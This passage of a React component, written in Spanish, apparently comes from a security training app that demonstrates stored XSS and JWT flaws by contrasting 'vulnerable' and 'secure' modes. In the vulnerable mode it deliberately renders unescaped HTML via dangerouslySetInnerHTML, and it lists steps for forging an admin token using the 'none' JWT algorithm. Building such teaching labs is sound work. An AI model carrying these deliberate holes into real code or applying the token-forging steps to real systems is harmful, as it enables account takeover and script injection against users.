                  : vuln.demoEndpoints.secure.method}
              </span>
            </div>
          </div>

          {(result || error) && (
            <div className="mt-4">
              <h4 className="text-sm font-medium text-gray-700 mb-2">
                Respuesta:
              </h4>
              {error && (
                <div className="mb-2 p-3 bg-danger-50 border border-danger-200 rounded-lg">
                  <p className="text-sm text-danger-800">{error}</p>
                </div>
              )}

              {/* XSS Stored Info */}
              {id === "xss" && result?.success && mode === "vulnerable" && (
                <div className="mb-3 p-3 bg-orange-50 border border-orange-200 rounded-lg">
                  <p className="text-sm text-orange-800">
                    <strong>⚠️ Stored XSS:</strong> El post malicioso fue
                    guardado en la base de datos. Para ver el XSS en acción,
                    visita{" "}
                    <code className="bg-orange-100 px-1 py-0.5 rounded">
                      GET /api/vulnerable/xss/posts
                    </code>{" "}
                    o abre la página que muestra posts. ¡El script se ejecutará
                    para TODOS los usuarios!
                  </p>
                </div>
              )}

              {/* Authentication JWT Decoder */}
              {id === "authentication-failures" &&
                result?.success &&
                result?.data?.token &&
                mode === "vulnerable" && (
                  <div className="mb-3 p-4 bg-red-50 border-2 border-red-300 rounded-lg">
                    <h5 className="text-sm font-bold text-red-900 mb-2">
                      🔓 JWT Vulnerable Detectado (Algoritmo "none")
                    </h5>
                    <p className="text-xs text-red-800 mb-3">
                      Este token NO tiene firma criptográfica. Puedes modificar
                      el payload y el servidor lo aceptará.
                    </p>

                    <div className="bg-white p-3 rounded border border-red-200 mb-3">
                      <p className="text-xs font-mono text-gray-700 break-all mb-2">
                        <strong>Token:</strong> {result.data.token}
                      </p>
                    </div>

                    <div className="bg-white p-3 rounded border border-red-200">
                      <p className="text-xs font-bold text-gray-900 mb-2">
                        💡 Cómo Explotarlo:
                      </p>
                      <ol className="text-xs text-gray-700 space-y-1 list-decimal list-inside">
                        <li>
                          Decodifica el token en{" "}
                          <a
                            href="https://jwt.io"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-blue-600 underline"
                          >
                            jwt.io
                          </a>
                        </li>
                        <li>
                          Cambia el campo{" "}
                          <code className="bg-gray-100 px-1 rounded">role</code>{" "}
                          a{" "}
                          <code className="bg-gray-100 px-1 rounded">
                            "admin"
                          </code>
                        </li>
                        <li>
                          Copia el token modificado (mantén el algoritmo como
                          "none")
                        </li>
                        <li>
                          Úsalo para acceder a endpoints protegidos como admin
                        </li>
                      </ol>
                    </div>

                    {(() => {
                      try {
                        const parts = result.data.token.split(".");
                        const payload = JSON.parse(atob(parts[1]));
                        return (
                          <div className="mt-3 bg-white p-3 rounded border border-red-200">
                            <p className="text-xs font-bold text-gray-900 mb-2">
                              🔍 Payload Decodificado:
                            </p>
                            <CodeBlock
                              code={JSON.stringify(payload, null, 2)}
                              language="json"
                            />
                          </div>
                        );
                      } catch (e) {
                        return null;
                      }
                    })()}
                  </div>
                )}

              <CodeBlock
                code={JSON.stringify(result, null, 2)}
                language="json"
                showLineNumbers
              />
            </div>
          )}

          {/* XSS Posts Preview */}
          {id === "xss" && xssPosts.length > 0 && (
            <div className="mt-6">
              <h4 className="text-sm font-medium text-gray-700 mb-3">
                📋 Posts en la Base de Datos (últimos 3):
              </h4>
              <div className="space-y-3">
                {xssPosts.slice(0, 3).map((post: any, index: number) => (
                  <div
                    key={post.id || index}
                    className={`p-4 rounded-lg border-2 ${
                      mode === "vulnerable"
                        ? "border-danger-200 bg-danger-50"
                        : "border-success-200 bg-success-50"
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <h5 className="font-semibold text-gray-900">
                        {post.title}
                      </h5>
                      <span className="text-xs text-gray-500">
                        ID: {post.id}
                      </span>
                    </div>

                    {mode === "vulnerable" ? (
                      <>
                        <div className="mb-2 p-2 bg-red-100 border border-red-300 rounded text-xs text-red-800">
                          ⚠️ <strong>PELIGRO:</strong> Contenido renderizado SIN
                          escapar (dangerouslySetInnerHTML)
                        </div>
                        <div
                          className="prose prose-sm max-w-none"
                          dangerouslySetInnerHTML={{ __html: post.content }}
                        />
                      </>
                    ) : (
                      <>
                        <div className="mb-2 p-2 bg-green-100 border border-green-300 rounded text-xs text-green-800">
                          ✅ <strong>SEGURO:</strong> Contenido escapado (React
                          escapa automáticamente)
                        </div>
                        <div className="prose prose-sm max-w-none text-gray-700">
                          {post.content}
                        </div>
                      </>
                    )}

                    <div className="mt-2 text-xs text-gray-500">
                      Por: {post.user?.username || "Usuario"} •{" "}
                      {new Date(post.createdAt).toLocaleString()}
                    </div>
                  </div>
                ))}
              </div>

              {mode === "vulnerable" && (
                <div className="mt-4 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
                  <p className="text-sm text-yellow-800">
                    💡 <strong>¿Viste el alert?</strong> Si había un{" "}
                    <code className="bg-yellow-100 px-1 py-0.5 rounded">
                      &lt;script&gt;
                    </code>{" "}
                    en algún post, se ejecutó automáticamente. Esto es{" "}
                    <strong>Stored XSS</strong>: el código malicioso está
                    guardado en la base de datos y se ejecuta para TODOS los
                    usuarios que vean esta página.
                  </p>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
